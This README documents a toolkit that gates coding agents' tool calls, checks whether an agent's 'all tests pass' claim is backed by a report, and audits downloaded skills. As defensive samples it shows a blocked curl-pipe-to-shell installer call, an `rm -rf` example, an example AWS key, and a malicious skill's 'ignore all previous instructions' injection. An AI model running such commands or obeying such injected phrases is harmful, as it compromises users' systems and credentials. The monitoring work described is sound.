# Jev Agent Kit

A fast, typed judgment layer for Claude Code, Codex and Hermes Agent, using
[TypeSafe's Jev](https://typesafe.ai).

An agent loop is full of narrow, frequent decisions that are not worth another full LLM turn. Is this
task done, or should I keep going? Which handler fits this request? Does the final message
actually claim the tests passed? Does this tool call look destructive? Jev is a model built
for exactly these questions: you define the possible answers, and it returns a probability
for each one instead of prose.

Keep deterministic facts in code. Use Jev for judgment calls that depend on language.
Your code combines the two and decides what happens next.

That splits the agent into three layers, each doing what it is good at:

| Agent | Deterministic code | Jev |
| --- | --- | --- |
| Finishes with a summary | Counts passed tests in the session's JUnit reports | Does the summary claim the tests passed? |
| Proposes a shell command | Parses it: recursive delete? force flag? pipe to a shell? | Given those facts and the stated purpose, is it destructive? |
| Receives a request | Knows which handlers exist and your policy | Which handler fits: code, a model, or a person? |

TypeSafe's API already gives you typed questions and structured answers. This kit adds what
it takes to use them inside an agent: question sets with declared, minimized input fields,
deterministic facts computed before the call, a pinned model, thresholds tied to one question
and one model version, a receipt for every decision, calibration tooling, and hooks and a
skill for all three hosts.

## Quick start

You need Python 3.11 or later and a Jev API key from [TypeSafe](https://typesafe.ai).

```sh
git clone https://github.com/nanoDBA/jev-agent-kit.git
cd jev-agent-kit
python -m pip install -e .
export TYPESAFE_API_KEY=...                # PowerShell: $env:TYPESAFE_API_KEY = "..."

python examples/verify_claim.py           # Jev + code: is "All tests pass" backed by a report?
python examples/claim_contrast.py         # what Jev tells apart that a keyword check cannot
python examples/route_request.py          # Jev: code, a specialist model, or a person?
python examples/gate_walkthrough.py       # Jev + code facts: how risky is rm -rf ./build?
python examples/show_receipt.py           # the record every decision leaves
```

Each demo asks Jev live and makes one to four calls. It sends only the sample text written in
the demo, never your files. No key? Add `--offline` to any demo to replay the answers Jev gave
to the same inputs on 2026-09-28. The outputs shown below are those recorded answers; a live
run usually differs by a few hundredths, sometimes more on an ambiguous request (see
[routing](#why-routing-needs-a-policy-and-evaluation)). Run the commands from the repository
root. If `jev-kit` is not on your PATH, use `python -m jev_kit.cli` instead.

## What works today

Installing the kit into a host does not switch on everything this README shows. Today:

| Part | What it does now | What you do |
| --- | --- | --- |
| Host hooks | One event per host: `PreToolUse` in Claude Code and Codex, `pre_tool_call` in Hermes. Each call the hook sees is checked with `tool-call-gate`; the guides register it for shell commands. In shadow mode, the default, the hook writes a receipt and changes nothing. | Register the hook with the [host guide](#add-it-to-your-agent). |
| Examples | The test-claim check, routing, gate and receipt demos ask Jev live (or replay recorded answers with `--offline`). They are not installed into any host. | Copy the pattern into your own code. |
| Question sets | `preflight-route`, `postflight-verify` and `stop-or-continue` ship as JSON. Nothing calls them automatically. | Call them from your code through the Python API or `jev-kit`. |
| Acting on answers | Nothing acts on a Jev answer until a threshold for that exact question is registered, and a hook acts only in enforce mode. | Collect live answers in shadow, label them, and [calibrate](docs/guides/calibration.md). |

## One example: "all tests pass"

An agent can finish with "All tests pass" without running a test. Code and Jev each take the
part they are good at:

```text
final message --+--> code: count passed tests in the JUnit reports  -> 0
                |
                +--> Jev: "does it claim the tests passed?"         -> p(yes)=0.98
                                  |
          your code: a claim with no report behind it -> ask the agent to run the tests
```

```sh
python examples/verify_claim.py
```

```text
Agent says:     'Refactored the parser and cleaned up the imports. All tests pass.'
Commands run:   git diff --stat, ruff check src, git add -A
Test reports:   0  (0 tests passed, counted in code)
Jev:            does the message claim the tests passed?  p(yes)=0.98
                (recorded Jev answer from 2026-09-28)
Verdict:        the claim is not backed by a test report; ask the agent to run them
```

Jev's part is interpretation, and a keyword search is a poor stand-in for it. Here are four
messages, none backed by a test report, with the answers Jev gave in our live evaluation:

```sh
python examples/claim_contrast.py
```

```text
Test reports: none (0 tests passed, counted in code)
Jev:          recorded Jev answers from 2026-09-28

message            says pass  Jev p(claim)  route      action today
explicit claim     yes        0.98          no_advice  ask agent to run tests
claim, no 'pass'   no         0.95          no_advice  ask agent to run tests
prediction         yes        0.03          no_advice  ask agent to run tests
admission          no         0.01          no_advice  ask agent to run tests

explicit claim     'Refactored the parser and cleaned up the imports. All tests pass.'
claim, no 'pass'   'Upgrade finished. No test failures.'
prediction         "The tests should pass, but I didn't run them."
admission          'Refactored the parser and cleaned up the imports. I have not run the tests yet.'
```

Jev separates a claim that never says "pass" from a prediction that does. The last column is
what the policy does today: this question has no calibrated threshold, so the kit returns
`no_advice` and the code treats every message as a claim. Once a threshold is measured on your
own messages, the code can skip the check for the last two. Interpretation and action stay
separate on purpose: without a measured threshold, no answer authorizes anything.

On 60 messages, Jev answered this question correctly 56 times out of the 57 it answered in
time; see [What we measured](#what-we-measured).

### How the check counts

The example counts tests only from the test runner's own JUnit XML report
(`pytest --junitxml`, or your runner's equivalent), never from the commands the agent ran:
`pytest -V` exits 0 without running a test, and `pytest || echo done` hides a failure. No
report means zero. A passing report shows that tests ran and passed; you still judge whether
they cover the change.

## Why routing needs a policy and evaluation

Given clear cases, the shipped `preflight-route` set answers the way you would expect.
These are live answers, one call each:

| Request | Jev's answer |
| --- | --- |
| "Convert 72 degrees Fahrenheit to Celsius." | deterministic 1.00 |
| "Write a short, friendly release note for a bug fix in the CSV export." | specialist_llm 0.92 |
| "A customer says their spouse died and asks us to close the joint account and waive the final bill." | human 0.99 |

Harder cases show why the kit waits for a measured threshold. A support request arrives:
should code handle it, a specialist model, or a person?

```sh
python examples/route_request.py
```

```text
request: 'Customer says order 1182 was charged twice and asks for a refund.'
Which handler should take it?  (recorded Jev answer from 2026-09-28)
  deterministic   ##############       0.68
  specialist_llm  #                    0.07
  human           #####                0.25
route:   no_advice
handled: specialist_llm
```

Jev returns a probability for every option you defined. This answer also moves more than the
clear cases do: asked eight more times later that day, `deterministic` ranged from 0.53 to
0.61 and `human` from 0.35 to 0.42, while the Fahrenheit request gave 1.00 every time.
Whether `deterministic` is right depends on things the question does not state: your refund
policy and what each handler can actually do. That is the lesson for routing: write the criteria into the question, then
measure on your own requests how often answers like this are right before acting on them. Here the kit reports `no_advice`, and the code uses its default, a
specialist model.

## Check a tool call before it runs

```sh
python examples/gate_walkthrough.py
```

An agent wants to run `rm -rf ./build` and describes it as "Delete everything in the build
output folder". The example never runs the command. It shows what would be sent, Jev's
answers to three questions about the call, and the routes a hook in enforce mode would get:

```text
destructive        p(yes)=0.91  -> ask
exfiltrates        p(yes)=0.03  -> ask
widens_permission  p(yes)=0.04  -> ask
```

<details><summary>The full request Jev receives</summary>

```json
{
  "cmd_force_flag": true,
  "cmd_git_history_rewrite": false,
  "cmd_modifies_permissions": false,
  "cmd_network_download": false,
  "cmd_package_install": false,
  "cmd_parse_confident": true,
  "cmd_pipes_to_shell": false,
  "cmd_recursive_delete": true,
  "cmd_targets_home_directory": false,
  "cmd_targets_root_or_system_path": false,
  "cmd_uses_elevation": false,
  "command": "rm",
  "context": "tool=Bash; description=Delete everything in the build output folder",
  "target": "id_7dcb134b1ad03cd1"
}
```

</details>

Jev sees `rm`, the agent's description, and yes/no facts the kit worked out locally from the
full command line, but no flags, arguments or readable path. The `cmd_*` facts say this is a
recursive, forced delete that does not aim at the system or home directory, so `rm file`
and `rm -rf /` no longer look the same. On this call they made a difference: without them,
Jev's destructive answer for the same command was 0.78. They are heuristic: a command the kit cannot read with
confidence (pipes, quoting, variables, `bash -c`, scripts, interpreters, package installs, and
similar) gets `null` for "unknown" and `cmd_parse_confident: false`, and in enforce mode such a
command always asks. See [ADR 0005](docs/adr/0005-command-properties.md). All three answers come
back as `ask` because no threshold is calibrated, so no answer can clear a check.

`context` is plain text and needs an explicit opt-in for live calls. The hooks do not add the
working directory to it, but a description can still name a folder.

## What this makes possible

The kit ships four question sets: `preflight-route`, `postflight-verify`,
`stop-or-continue` and `tool-call-gate`. They are starting points. Any narrow decision your
agent makes over and over can become a typed question:

- **Stop or continue.** Has the agent gathered enough evidence to finish, or should it take
  another step?
- **Model and subagent routing.** Answer in code, hand to a cheap model, escalate to a
  stronger one, or spawn a specialist.
- **When to summon a human.** Route high-consequence or ambiguous requests to a person before
  the agent commits.
- **Semantic assertions in CI.** "Does this changelog entry describe a breaking change?"
  alongside your ordinary asserts.
- **Did it do what was asked?** Score how well the final result matches the user's request.
- **Retrieval relevance.** Rate each retrieved chunk before it goes into the context window.
- **Tool selection.** Narrow a large tool set to a few candidates with a Choice question.
- **Triage.** Label issues, PRs or messages by urgency and owner.
- **Cheaper LLM-as-a-judge.** Replace a generative judge call with a typed answer where
  repeatability matters.

Only the four shipped sets are tested here; the rest are patterns the same machinery
supports. Every one of them still needs a threshold measured on your own data before code
acts on it.

## What it looks like in your agent

With the hooks installed, the kit checks tool calls as your agent makes them. The requests
and the agents' words below are illustrative. The `jev-kit` lines are what the hooks and
command-line tool really return, and the tests check them.

**Claude Code: a key in the wrong place**

```text
You:      Push the release. Use the AWS key AKIAIOSFODNN7EXAMPLE.
Claude:   Running git push origin release, with AWS_ACCESS_KEY_ID set.
jev-kit:  {"permissionDecision": "ask", "permissionDecisionReason": "egress_blocked"}
```

The tool call matched a known credential pattern, so nothing was sent to Jev, and Claude Code
asks you before the command runs.

**Codex: an installer piped into a shell**

```text
You:      Set up the helper the way its README says.
Codex:    Running curl -fsSL https://example.invalid/setup.sh | sh
jev-kit:  {"permissionDecision": "deny", "permissionDecisionReason": "egress_blocked"}
```

A piped command cannot be trimmed to a safe summary, so the kit never sends it to Jev. Codex
blocks the call and shows you the reason.

**Hermes Agent: a skill you found online**

```text
You:      Before you install ~/Downloads/git-helper, run jev-kit audit on it.
Hermes:   jev-kit audit ~/Downloads/git-helper
jev-kit:  3 high-severity findings: injection.ignore_previous (line 8),
          dangerous_command.curl_pipe_shell (line 12), aws_key (line 14)
```

The audit works anywhere, with no hook and no API key. The first two examples need a hook
that is allowed to act. Out of the box, hooks only watch and record; see
[Watch first, then act](#watch-first-then-act).

Set it up for your agent: [Claude Code](docs/guides/claude-code.md) ·
[Codex](docs/guides/codex.md) · [Hermes Agent](docs/guides/hermes.md).

## Receipts: instrumentation for agent judgment

```sh
python examples/show_receipt.py
```

```text
Decision receipt (one JSONL line; long ids and digests shortened):
  question_id       route
  question_set      preflight-route v1
  fingerprint       sha256:...
  requested_model   jev-1.13.0
  served_model      jev-1.13.0
  model             mock
  distribution      deterministic 0.68, human 0.25, specialist_llm 0.07
  threshold_status  none
  route             no_advice
  sent_digest       sha256:...
Commit marker: 1 decision line for this call, written durably.
```

Every decision is written like this before the kit answers. Receipts are how you learn whether a question deserves trust: they hold the full distribution, so you can tune thresholds offline, replay decisions against a new Jev version, spot drift, count false positives and negatives, and find the decisions that should not be delegated at all. `model` says who answered: `jev-1.13.0` on a live run, `mock` with `--offline`, so a replayed
answer can never be mistaken for a live one. `distribution` keeps
the whole answer for measuring thresholds later, and `threshold_status` says whether a
measured threshold exists. [Receipts](docs/receipts.md) explains the other fields.

## Built not to do something stupid

Putting a model inside an agent loop is only useful if it cannot make things worse. Before
any model call the kit sends only declared fields, cuts commands to their program name,
hashes paths, and refuses requests that match credential patterns. Hooks start in shadow mode,
and a Jev answer can never grant a permission. Two demos show the deterministic side, which
needs no model at all:

```sh
jev-kit audit examples/suspicious-skill   # inspect a skill before installing it
python examples/leak_check.py             # keep a leaked AWS key out of the request
```

### Scan a skill before you install it

Skills are instructions your agent will follow, so a downloaded one deserves a look first.
[`examples/suspicious-skill`](examples/suspicious-skill/SKILL.md) is a deliberately malicious
"git helper":

```sh
jev-kit audit examples/suspicious-skill
```

```text
SKILL.md:8   high  injection.ignore_previous         "ignore all previous instructions"
SKILL.md:12  high  dangerous_command.curl_pipe_shell  curl ... | sh
SKILL.md:14  high  aws_key                            a leaked AWS access key
```

That is a summary of the JSON the command prints. The audit only reads files; it never runs
them or calls a model. It looks for known patterns, so a clean result means no pattern
matched, not that a skill is safe.

### Stop a leaked key before it leaves your machine

```sh
python examples/leak_check.py
```

```text
The agent's tool call carries a leaked key:
  context: tool=Bash; description=Push after setting AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

jev-kit checks the exact outgoing bytes before sending:
  BLOCKED  fail_reason=egress_blocked  requests sent: 0

The same call without the key passes, reduced to what would be sent:
  {"command": "git", "context": "tool=Bash; description=Push the release branch", "target": "id_2be341514b09d550"}
```

The kit scans every request for recognized credential patterns before sending it, and refuses
the whole request if one matches. In the request that does go out, the command is only its
program name and the file path is a keyed hash. The key shown is AWS's published example,
not a real credential.

### How the kit stays safe

The default configuration is designed not to weaken your agent's existing permission
controls.

**Your agent's permission system stays in charge.** Jev can advise that a tool call looks
safe, but it cannot approve one or bypass your agent's normal checks. The hooks can ask for
review or block a call; they never remove an existing approval requirement.

**Nothing is trusted until you measure it.** Before the kit acts on a Jev answer, you
calibrate that question against labeled examples from your own work, which gives you a
confidence threshold for it. No calibrated thresholds ship with the kit. Until you add one,
an advisory question (such as routing) returns `no_advice` and your code keeps its normal
path, and a gate (such as the tool-call checks) returns `ask`, so the call needs a person or
another check.

**Replayed answers never approve anything.** With `--offline`, the demos' recorded answers
are marked as mock answers everywhere they appear, including receipts, and the kit never acts
on them.

**Only what a question needs leaves your machine.** Each question declares the fields it
uses; everything else stays local. Commands are cut to their program name, paths become keyed
hashes, and requests matching recognized credential patterns are refused. See
[What leaves your machine](#what-leaves-your-machine).

#### Watch first, then act

The hooks start in **shadow mode**. With an API key configured, they ask Jev and record the
answer, but they never change what your agent does; every real answer is recorded as
`no_advice`. This lets you collect evidence before relying on it.

**Enforce mode** lets the hooks act on their checks. It is off unless someone turns it on,
and it should be turned on only with the environment owner's approval, after measuring
thresholds on labeled data. Two stops work without any calibration: a request matching a
recognized credential pattern, and a command that cannot be safely summarized.

If enforce mode is turned on before any thresholds are measured, every other checked call is
also stopped for review, even harmless ones such as `ls`: Claude Code asks you, while Codex
and Hermes block the call. That makes enforce mode impractical until you calibrate.

| Host | What the hook returns when a check does not pass in enforce mode |
| --- | --- |
| Claude Code | `permissionDecision: "ask"`: Claude Code asks you |
| Codex | `permissionDecision: "deny"` and exit code `2`: Codex blocks the call |
| Hermes Agent | `action: "block"`: Hermes stops the call |

When every check passes, a hook returns no decision (`{}` or `None`), and your agent's usual
rules apply.

## What we measured

Our own live evaluation, 2026-09-28, on `jev-1.13.0`: about 300 calls with synthetic
inputs. It is small, and the test messages and their labels were written by Claude, the AI
assistant that develops this kit, not checked by a person. The method, data and every result
are in [research note 12](docs/research/12-live-evaluation.md).

| What | Result |
| --- | --- |
| "Does this message claim the tests passed?" on 60 messages | First run: 56 of 57 answered correctly at a 0.5 cut-off; 3 timed out. Rerun: 59 of 60, no timeouts |
| The same, worded "…after the latest change?" | 60 of 60 correct; claims 0.75 to 0.99, non-claims 0.01 to 0.09 |
| The same question asked 8 times | Clear yes/no messages: moved by at most 0.01. An ambiguous routing request: the top option ranged 0.53 to 0.61 over 8 calls, against 0.68 in one call that morning |
| The four shipped question sets and all three hooks | Worked end to end, live |
| Tokens per call | First run: 340 to 391 input, 43 to 61 output. Rerun: 291 to 372 input, 36,923 over 123 calls (output not recorded) |
| Jev call latency | Usually 0.17 to 0.31 seconds; in the first run, occasional 4 to 7 second calls and 3 of 60 over the 10-second deadline; none in the 123-call rerun (slowest 0.32 s) |
| Hook overhead, end to end | About 2.3 seconds per tool call in each host, including starting the hook process and fetching the key through `TYPESAFE_API_KEY_COMMAND`; one run per host |

The one miss, both times: "Tests were passing yesterday; I have not rerun them after today's
change." It was labeled no claim; Jev gave 0.84, then 0.83. The message does claim that tests
passed, just not after the change, and the question never said "after the change". Adding
those words fixed it (0.02) and cost some confidence on terse claims ("Tests pass. Ready for
review.": 0.81). Wording is part of the question: each wording gets its own threshold.

These numbers are for one configuration on one day. A hook check adds its full end-to-end time
to every tool call it sees, and it saves nothing unless it replaces work you would otherwise do.

## What others have measured

Other people's measurements, with their caveats, are in
[research note 10](docs/research/10-examples-and-evidence.md#summary-table). In brief: one
study found LLM judges' repeat variance 92x to 913x higher than Jev's on a small corpus; a
pre-registered comparison against Claude Haiku won one task and lost another; and a
2,000-email phishing test found one broad question far behind Haiku (62.6% vs 81.3%) while
five narrow questions combined reached 95.0% vs 93.2%.


Across these studies, and in ours, Jev's clearest strength is giving the same answer twice,
at a low cost per call. Accuracy depends on the task and on how the question is split up, and
confidence has to be calibrated for each question. That is why this kit asks narrow
questions, keeps facts in code, and acts on nothing until a threshold is measured on your
data. TypeSafe publishes larger speed and cost multiples; we found no independent test of
those, so treat them as vendor claims. An extra check that replaces nothing adds cost.

## Choose a question type

| Type | Use it for | What Jev returns |
| --- | --- | --- |
| Noul (TypeSafe's name for a yes/no question) | A yes/no judgment, such as whether a message claims the tests passed | The probability of yes |
| Choice | A fixed menu, such as code, a specialist model or a person | A probability for each option |
| Score | A rating on a scale whose levels you define | A probability for each level |

Keep arithmetic, counts, date comparisons and exact text matching in code, and give Jev the
facts it needs for the judgment rather than a whole transcript. A confident answer does not
prove those facts were complete or correct.

The kit ships four [question sets](skills/jev-runtime/questions/): `preflight-route`,
`postflight-verify`, `stop-or-continue` and `tool-call-gate`. The
[runtime skill](skills/jev-runtime/SKILL.md) explains how to frame questions, check that
enough evidence is available, and handle uncertain answers.

Every answer comes back with one of three routes:

| Route | What your code should do |
| --- | --- |
| `accept` | The answer cleared a threshold you measured. Act on it; your agent's permission checks still apply. |
| `ask` | A check did not pass, or something failed. Ask a person or run a deterministic check. |
| `no_advice` | There is no usable answer yet, or the kit is in shadow mode. Keep your normal path. |

## Add it to your agent

With the environment owner's approval, follow the guide for your host. Each guide starts in
shadow mode and covers installing the skill separately from registering the hook:

- [Claude Code](docs/guides/claude-code.md)
- [Codex](docs/guides/codex.md)
- [Hermes Agent](docs/guides/hermes.md)

To preview what a skill install would change without changing anything, run
`jev-kit install --scope repo`; see [the CLI guide](docs/guides/cli.md#preview-a-skill-install).

## What leaves your machine

Only fields a question set declares are sent, after they are trimmed. For `tool-call-gate`:

| Field | What is sent |
| --- | --- |
| `command` | The program name only. `rm -rf ./build` becomes `rm`. |
| `cmd_*` | Yes/no facts computed locally from the full command line, such as `cmd_recursive_delete` or `cmd_uses_elevation`, or `null` for unknown. Never text. |
| `target` | A keyed hash of the file path or URL, never the path itself. |
| `context` | Plain text: the tool name, plus the description in Claude Code, turn id in Codex, or task id in Hermes. The hooks do not add the working directory, but a description or id can still contain a folder name. Email addresses, IP addresses and phone numbers are masked. |

The gate always includes `context`. Unless `agent_context` is in `JEV_KIT_SOURCE_ALLOWLIST`,
live gate requests are refused before sending, so no evidence is collected. Adding it means
accepting that directory names and other unmasked context can leave the machine. The routing
example's `request` field uses the separate source type `agent_request`.

The kit scans the exact outgoing bytes for recognized credential and other prohibited-data
patterns and refuses a request that matches. No scanner catches every secret. Source-code
fields are refused outright for now, and log fields keep only level keywords and masked
placeholders.

Receipts hold decision details and digests, never raw state or API keys. See
[ADR 0002](docs/adr/0002-egress-policy.md) for the policy and its accepted risks.

## Reference

- [Command-line tool](docs/guides/cli.md): JSON requests, standard input, exit codes and the
  install preview.
- [Calibration](docs/guides/calibration.md): from shadow receipts to a registered threshold, with an offline walkthrough.
- [Live calls](docs/guides/live-calls.md): API keys, the source allowlist, attestation, and
  measuring thresholds. Live calls send data to TypeSafe; read it before adding credentials.
- [Receipts](docs/receipts.md): every field of a decision record.
- [CLI schemas](docs/schemas/README.md) and [TypeSafe's API](https://docs.typesafe.ai/api.md).
- [ADR 0002](docs/adr/0002-egress-policy.md): the egress policy and its accepted risks.

## Development

See [CONTRIBUTING.md](CONTRIBUTING.md) for development dependencies. Then run:

```sh
python -m pytest
python -m ruff check src tests scripts tools examples
python -m mypy
```

Tests never call the live API. `tests/test_docs_examples.py` checks the examples and outputs
shown here. Design decisions live in [docs/adr](docs/adr/), specifications in
[docs/specs](docs/specs/), and the evidence-backed skill maintenance workflow in
[this guide](docs/evidence-backed-maintenance.md).

Report security problems privately as described in [SECURITY.md](SECURITY.md).

## License

MIT. See [LICENSE](LICENSE).

TypeSafe, Jev, Claude, Claude Code, Codex, and Hermes Agent are trademarks of their respective
owners. This project is independent and is not affiliated with or endorsed by them.
